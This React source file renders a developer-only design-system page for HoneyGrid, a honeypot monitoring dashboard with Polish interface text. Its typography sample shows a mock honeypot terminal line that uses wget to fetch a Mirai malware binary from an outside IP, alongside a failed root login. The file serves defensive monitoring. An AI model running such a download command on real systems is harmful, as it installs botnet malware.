import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from '@/components/ui/dialog';
import { Skeleton } from '@/components/ui/skeleton';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Tooltip, TooltipContent, TooltipTrigger } from '@/components/ui/tooltip';
import { SeverityBadge } from '@/components/SeverityBadge';
import type { Severity } from '@/types/api';

const COLOR_TOKENS = [
  { name: '--background', cls: 'bg-background', desc: 'Tło aplikacji' },
  { name: '--card', cls: 'bg-card', desc: 'Tło kart i paneli' },
  { name: '--primary', cls: 'bg-primary', desc: 'Akcent miodowy (HoneyGrid)' },
  { name: '--secondary', cls: 'bg-secondary', desc: 'Elementy drugorzędne' },
  { name: '--muted', cls: 'bg-muted', desc: 'Tła wyciszone' },
  { name: '--accent', cls: 'bg-accent', desc: 'Wyróżnienie (hover, aktywne)' },
  { name: '--destructive', cls: 'bg-destructive', desc: 'Akcje destrukcyjne' },
  { name: '--border', cls: 'bg-border', desc: 'Obramowania' },
] as const;

const SEVERITY_TOKENS = [
  { name: '--severity-critical', cls: 'bg-severity-critical', severity: 'critical' as Severity },
  { name: '--severity-high', cls: 'bg-severity-high', severity: 'high' as Severity },
  { name: '--severity-medium', cls: 'bg-severity-medium', severity: 'medium' as Severity },
  { name: '--severity-low', cls: 'bg-severity-low', severity: 'low' as Severity },
] as const;

export function DesignSystemPage() {
  return (
    <section className="space-y-8">
      <div>
        <h2 className="text-2xl font-bold tracking-tight">System projektowy</h2>
        <p className="mt-1 max-w-2xl text-muted-foreground">
          Tokeny, typografia i komponenty interfejsu HoneyGrid. Strona deweloperska — nie trafia do
          nawigacji produkcyjnej.
        </p>
      </div>

      <Tabs defaultValue="colors">
        <TabsList>
          <TabsTrigger value="colors">Kolory</TabsTrigger>
          <TabsTrigger value="typography">Typografia</TabsTrigger>
          <TabsTrigger value="components">Komponenty</TabsTrigger>
          <TabsTrigger value="severity">Odznaki severity</TabsTrigger>
        </TabsList>

        {/* ── Kolory ── */}
        <TabsContent value="colors" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Tokeny semantyczne</CardTitle>
              <CardDescription>
                Zmienne CSS zgodne z konwencją shadcn/ui — motyw ciemny (SOC).
              </CardDescription>
            </CardHeader>
            <CardContent className="grid grid-cols-2 gap-4 md:grid-cols-4">
              {COLOR_TOKENS.map((token) => (
                <div key={token.name} className="space-y-1.5">
                  <div className={`h-14 rounded-md border ${token.cls}`} />
                  <p className="font-mono text-xs">{token.name}</p>
                  <p className="text-xs text-muted-foreground">{token.desc}</p>
                </div>
              ))}
            </CardContent>
          </Card>
          <Card>
            <CardHeader>
              <CardTitle>Skala zagrożeń</CardTitle>
              <CardDescription>Kolory poziomów ważności zdarzeń i incydentów.</CardDescription>
            </CardHeader>
            <CardContent className="grid grid-cols-2 gap-4 md:grid-cols-4">
              {SEVERITY_TOKENS.map((token) => (
                <div key={token.name} className="space-y-1.5">
                  <div className={`h-14 rounded-md ${token.cls}`} />
                  <p className="font-mono text-xs">{token.name}</p>
                </div>
              ))}
            </CardContent>
          </Card>
        </TabsContent>

        {/* ── Typografia ── */}
        <TabsContent value="typography" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Krój systemowy i monospace</CardTitle>
              <CardDescription>
                Tekst interfejsu używa stosu systemowego; adresy IP, komendy i terminal — kroju
                monospace (JetBrains Mono / ui-monospace).
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="space-y-1">
                <h1 className="text-3xl font-bold">Nagłówek pierwszego stopnia</h1>
                <h2 className="text-2xl font-semibold">Nagłówek drugiego stopnia</h2>
                <h3 className="text-xl font-semibold">Nagłówek trzeciego stopnia</h3>
                <p>Tekst podstawowy — opisy zdarzeń, treść raportów i komunikaty interfejsu.</p>
                <p className="text-sm text-muted-foreground">
                  Tekst pomocniczy — podpisy, metadane, znaczniki czasu.
                </p>
              </div>
              <div className="rounded-md border bg-background p-4 font-mono text-sm">
                <p className="text-severity-low">
                  root@honeypot:~$ wget http://185.224.128.43/bins/mirai.x86
                </p>
                <p className="text-muted-foreground">Łączenie z 185.224.128.43:80... połączono.</p>
                <p className="text-severity-medium">
                  192.0.2.146 → hp-ssh-weu-01 [login.failed] root / 123456
                </p>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* ── Komponenty ── */}
        <TabsContent value="components" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Przyciski</CardTitle>
            </CardHeader>
            <CardContent className="flex flex-wrap gap-3">
              <Button>Domyślny</Button>
              <Button variant="secondary">Drugorzędny</Button>
              <Button variant="outline">Obrys</Button>
              <Button variant="ghost">Duch</Button>
              <Button variant="destructive">Usuń incydent</Button>
              <Button variant="link">Łącze</Button>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Tabela</CardTitle>
              <CardDescription>Przykładowe zdarzenia z sensorów.</CardDescription>
            </CardHeader>
            <CardContent>
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Adres IP</TableHead>
                    <TableHead>Sensor</TableHead>
                    <TableHead>Typ zdarzenia</TableHead>
                    <TableHead>Poziom</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  <TableRow>
                    <TableCell className="font-mono">203.0.113.42</TableCell>
                    <TableCell>hp-ssh-weu-01</TableCell>
                    <TableCell>Nieudane logowanie</TableCell>
                    <TableCell>
                      <SeverityBadge severity="medium" />
                    </TableCell>
                  </TableRow>
                  <TableRow>
                    <TableCell className="font-mono">198.51.100.7</TableCell>
                    <TableCell>hp-web-weu-01</TableCell>
                    <TableCell>Żądanie HTTP</TableCell>
                    <TableCell>
                      <SeverityBadge severity="low" />
                    </TableCell>
                  </TableRow>
                  <TableRow>
                    <TableCell className="font-mono">185.224.128.43</TableCell>
                    <TableCell>hp-ssh-neu-02</TableCell>
                    <TableCell>Komenda (pobranie binarium)</TableCell>
                    <TableCell>
                      <SeverityBadge severity="critical" />
                    </TableCell>
                  </TableRow>
                </TableBody>
              </Table>
            </CardContent>
          </Card>

          <Card>
            <CardHeader>
              <CardTitle>Okno dialogowe, podpowiedź i szkielet</CardTitle>
            </CardHeader>
            <CardContent className="flex flex-wrap items-center gap-6">
              <Dialog>
                <DialogTrigger asChild>
                  <Button variant="outline">Otwórz okno dialogowe</Button>
                </DialogTrigger>
                <DialogContent>
                  <DialogHeader>
                    <DialogTitle>Szczegóły zdarzenia</DialogTitle>
                    <DialogDescription>
                      Tu pojawią się pełne metadane zdarzenia honeypot wraz z klasyfikacją
                      kill-chain.
                    </DialogDescription>
                  </DialogHeader>
                </DialogContent>
              </Dialog>

              <Tooltip>
                <TooltipTrigger asChild>
                  <Button variant="ghost">Najedź na mnie</Button>
                </TooltipTrigger>
                <TooltipContent>Podpowiedź kontekstowa</TooltipContent>
              </Tooltip>

              <div className="w-48 space-y-2">
                <Skeleton className="h-4 w-full" />
                <Skeleton className="h-4 w-3/4" />
                <Skeleton className="h-4 w-1/2" />
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* ── Odznaki severity ── */}
        <TabsContent value="severity" className="space-y-4">
          <Card>
            <CardHeader>
              <CardTitle>Poziomy zagrożenia</CardTitle>
              <CardDescription>
                Cztery poziomy ważności używane w całej aplikacji (zdarzenia, aktorzy, incydenty).
              </CardDescription>
            </CardHeader>
            <CardContent className="flex flex-wrap items-center gap-3">
              <SeverityBadge severity="critical" />
              <SeverityBadge severity="high" />
              <SeverityBadge severity="medium" />
              <SeverityBadge severity="low" />
              <Badge>Domyślna</Badge>
              <Badge variant="secondary">Drugorzędna</Badge>
              <Badge variant="outline">Obrys</Badge>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </section>
  );
}
